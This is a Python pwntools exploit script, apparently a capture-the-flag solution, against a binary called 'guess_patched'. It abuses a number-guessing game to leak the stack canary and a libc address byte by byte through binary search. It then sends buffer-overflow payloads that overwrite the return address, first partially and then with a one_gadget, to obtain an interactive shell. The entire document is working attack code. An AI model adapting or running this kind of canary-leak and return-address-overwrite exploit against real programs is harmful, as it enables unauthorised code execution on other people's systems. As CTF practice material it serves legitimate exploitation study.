#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('guess_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']

filterwarnings("ignore")
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
b *main+395
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def search(idx):
    low, high = 0, 0xff
    
    while low <= high:
        mid = (low + high) // 2
        io.recvuntil(b")?")
        io.sendline(str(idx).encode())
        io.recvuntil(b":")
        io.sendline(str(mid).encode())
        r = io.recvline()

        if b"got it" in r:
            return hex(mid)[2:]
        elif b"low" in r:
            low = mid
        else:
            high = mid
        
    return


def leak_canary():
    canary = ""

    for idx in range(39, 31, -1):
        canary += search(idx)

    canary = int(canary.ljust(16, "0"), 16)
    return canary


def leak_libc():
    libc = ""

    for idx in range(53, 45, -1):
        libc += search(idx)

    base = int(libc[:-4], 16) - 0x270b3
    return base


def solve():

    canary = leak_canary()
    info("canary: %#x", canary)

    payload = b'A'*24
    payload += p64(canary)
    payload += b'B'*8
    payload += p8(0x99)

    io.recvuntil(b"game?")
    io.send(payload)

    libc_base = leak_libc()
    info("libc base: %#x", libc_base)
    one_gadget = libc_base + 0xe6c7e

    payload = b'A'*24
    payload += p64(canary)
    payload += b'B'*8
    payload += p64(one_gadget)

    io.recvuntil(b"game?")
    io.send(payload)

    io.interactive()


def main():
    
    init()
    solve()

if __name__ == '__main__':
    main()

